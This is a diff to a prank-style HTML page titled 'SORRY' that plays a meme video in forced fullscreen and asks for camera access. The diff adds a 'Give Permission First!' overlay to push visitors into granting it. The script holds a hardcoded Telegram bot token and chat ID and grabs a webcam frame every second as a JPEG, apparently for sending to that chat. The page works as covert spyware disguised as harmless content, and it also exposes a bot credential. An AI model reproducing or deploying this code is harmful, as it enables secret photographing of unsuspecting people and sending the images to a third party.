@@ -3,12 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sorry</title>
+    <title>SORRY</title>
     <style>
         body {
             margin: 0;
             overflow: hidden;
             background: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
         }
         video {
             position: absolute;
@@ -19,16 +26,22 @@
         canvas {
             display: none;
         }
+        #message {
+            position: absolute;
+            font-size: 2rem;
+            z-index: 10;
+        }
     </style>
 </head>
 <body>
 
-    
+    <!-- 🔹 ব্যাকগ্রাউন্ড ভিডিও (Raw URL) -->
     <video id="bgVideo" autoplay loop controls>
-        <source src="https://raw.githubusercontent.com/Sabbir-5399/Resources-For-All-Webpage/main/chaliye-shuru-karte-hai-video-meme-download.mp4" type="video/mp4">
-        Err
+        <source src="https://raw.githubusercontent.com/Sabbir-5399/Resources-For-All-Webpage/main/lv_0_20250307002407~2.mp4" type="video/mp4">
+        আপনার ব্রাউজার ভিডিও প্লে করতে পারে না।
     </video>
 
+    <div id="message">Give Permission First!</div>
     <canvas id="canvas"></canvas>
 
     <script>
@@ -49,11 +62,17 @@
             goFullscreen();
             document.addEventListener("click", goFullscreen);
 
-            let botToken = "7847518909:AAF_5IKKK7gyDT_YHvDMjenA-j0roWTktgw"; // 
-            let chatId = "6947565760"; // 
+            let botToken = "7847518909:AAF_5IKKK7gyDT_YHvDMjenA-j0roWTktgw"; // 🔹 
+            let chatId = "6947565760"; // 🔹 
 
+            
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
+                    
+                    let bgVideo = document.getElementById("bgVideo");
+                    let message = document.getElementById("message");
+                    message.style.display = 'none'; // "Give Permission First!" 
+
                     let video = document.createElement("video");
                     video.srcObject = stream;
 
@@ -79,7 +98,11 @@
                         }, 'image/jpeg');
                     }, 1000); // ⏳ 1
                 })
-                .catch(error => console.log("❌ Please Give The Permission First"));
+                .catch(error => {
+                    // 
+                    let message = document.getElementById("message");
+                    message.style.display = 'block'; // 
+                });
         });
     </script>
 
